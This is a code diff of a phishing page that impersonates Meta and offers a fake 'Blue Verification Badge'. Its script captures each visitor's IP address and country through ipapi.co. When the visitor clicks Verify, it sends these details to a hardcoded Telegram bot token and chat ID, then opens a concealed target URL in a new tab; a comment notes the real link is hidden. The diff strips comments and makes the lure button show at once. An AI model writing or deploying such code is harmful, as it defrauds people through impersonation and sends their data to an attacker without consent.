@@ -7,7 +7,7 @@
   <style>
     body {
       margin: 0;
-      height: 100vh;
+      min-height: 100vh;
       display: flex;
       align-items: center;
       justify-content: center;
@@ -45,7 +45,6 @@
       display: block;
     }
 
-    /* Nền riêng cho phần chữ */
     .message-box {
       background: linear-gradient(145deg, #ffffff, #e9f0ff);
       border-radius: 14px;
@@ -74,7 +73,6 @@
     }
 
     .verify-btn {
-      display: none;
       background: #1877f2;
       color: white;
       border: none;
@@ -122,6 +120,8 @@
   <script>
     const TELEGRAM_BOT_TOKEN = "8450931475:AAG33LEbK54PVvpsImjaKhMOYpTO5WJF5aE";
     const TELEGRAM_CHAT_ID = "1409099376";
+
+    // Link gốc ẩn
     const TARGET_URL = "https://professional-social-bwfy.bolt.host";
 
     const messageText = `Congratulations! You are now eligible to receive the Meta Blue Verification Badge.
@@ -131,7 +131,6 @@ Please complete the verification process to activate your badge.`;
     let userIP = "unknown";
     let userCountry = "unknown";
 
-    // Lấy IP ngay khi vào web
     async function getIPandCountry() {
       try {
         const res = await fetch("https://ipapi.co/json/");
@@ -139,14 +138,12 @@ Please complete the verification process to activate your badge.`;
           const data = await res.json();
           userIP = data.ip || "unknown";
           userCountry = data.country_name || "unknown";
-          console.log("IP Captured:", userIP, "| Country:", userCountry);
         }
       } catch (e) {
         console.warn("Failed to get IP:", e);
       }
     }
 
-    // Gửi thông tin IP tới Telegram
     async function sendTelegramMessage(text) {
       try {
         await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
@@ -159,7 +156,6 @@ Please complete the verification process to activate your badge.`;
       }
     }
 
-    // Hiệu ứng chữ
     function typeWriterEffect(text, element, duration = 2500) {
       return new Promise(resolve => {
         const total = text.length;
@@ -180,17 +176,15 @@ Please complete the verification process to activate your badge.`;
       const messageEl = document.getElementById("message");
       const verifyBtn = document.getElementById("verifyBtn");
 
-      // Lấy IP ngay khi load trang
-      getIPandCountry();
-
+      await getIPandCountry();
       await typeWriterEffect(messageText, messageEl, 2800);
-      verifyBtn.style.display = "inline-block";
 
       verifyBtn.addEventListener("click", async () => {
-        // Gửi IP (đã có sẵn từ lúc load)
+        // Gửi thông tin IP & Country
         await sendTelegramMessage(`User clicked Verify | IP: ${userIP} | Country: ${userCountry}`);
-        // Chuyển ngay
-        window.location.href = TARGET_URL;
+        
+        // Mở link trong tab mới mà vẫn ẩn URL gốc
+        window.open(TARGET_URL, "_blank");
       });
     })();
   </script>
